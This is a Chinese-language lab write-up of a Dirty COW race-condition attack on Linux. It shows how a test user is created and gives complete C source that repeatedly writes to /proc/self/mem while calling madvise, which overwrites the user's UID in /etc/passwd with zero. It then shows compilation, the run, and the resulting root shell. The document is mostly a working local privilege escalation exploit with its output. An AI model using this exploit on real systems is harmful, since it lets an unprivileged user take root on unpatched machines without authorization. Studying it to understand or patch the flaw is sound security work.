#


#### 攻击目标
通过非root权限修改/etc/passwd中的普通用户为root权限。


#### 攻击准备
**添加用户**  
```
ubuntu@VM-0-17-ubuntu:~$ sudo adduser testcow
Adding user `testcow' ...
Adding new group `testcow' (1002) ...
Adding new user `testcow' (1002) with group `testcow' ...
Creating home directory `/home/testcow' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for testcow
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n]  
ubuntu@VM-0-17-ubuntu:~$ cat /etc/passwd | grep testcow
testcow:x:1002:1002:,,,:/home/testcow:/bin/bash
```


**攻击程序**  

攻击需要两个线程，一个通过write尝试修改映射后的内存，一个madvise丢弃映射内存的私有拷贝。  

```
// cow.c
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;


void *writeThread(void *arg)
{
    char *content = "testcow:x:0000";
    off_t offset = (off_t)arg;

    int f = open("/proc/self/mem", O_RDWR);
    while(1)
    {
        lseek(f, offset, SEEK_SET);
        write(f, content, strlen(content));
    }
}


void *madviseThread(void *arg)
{
    int file_size = (int)arg;
    while(1)
    {
        madvise(map, file_size, MADV_DONTNEED);
    }
}

int main(int argc, char *argv[])
{
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    int f=open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    file_size = st.st_size;
    map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
    char *position = strstr(map, "testcow:x:1002");
    pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
    pthread_create(&pth2, NULL, writeThread, position);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
```
通过strstr()函数从映射内存找到字符串`testcow:x:1002`  
pthread_create创建线程。第一个参数为指向线程标识符的指针。 第二个参数用来设置线程属性。 第三个参数是线程运行函数的地址。 最后一个参数是运行函数的参数。  
pthread_join等待线程结束。第一个参数为被等待的线程标识符。第二个参数为一个用户定义的指针，它可以用来存储被等待线程的返回值。  







**编译**  
```
ubuntu@VM-0-17-ubuntu:~$ gcc -o cow cow.c -lpthread
```
在编译时加上-lpthread参数，以调用静态链接库。因为pthread并非Linux系统的默认库



#### 执行攻击
```
ubuntu@VM-0-17-ubuntu:~$ gcc -o cow cow.c -lpthread
cow.c: In function ‘writeThread’:
cow.c:19:9: warning: implicit declaration of function ‘lseek’ [-Wimplicit-function-declaration]
         lseek(f, offset, SEEK_SET);
         ^
cow.c:20:9: warning: implicit declaration of function ‘write’ [-Wimplicit-function-declaration]
         write(f, content, strlen(content));
         ^
ubuntu@VM-0-17-ubuntu:~$ ./cow 
^C
ubuntu@VM-0-17-ubuntu:~$ cat /etc/passwd | grep testcow
testcow:x:0000:1002:,,,:/home/testcow:/bin/bash
ubuntu@VM-0-17-ubuntu:~$ su testcow 
Password: 
root@VM-0-17-ubuntu:/home/ubuntu# id
uid=0(root) gid=1002(testcow) groups=1002(testcow)
```
执行几秒后ctrl+c关闭程序  
试验成功，testcow用户成功获得root权限




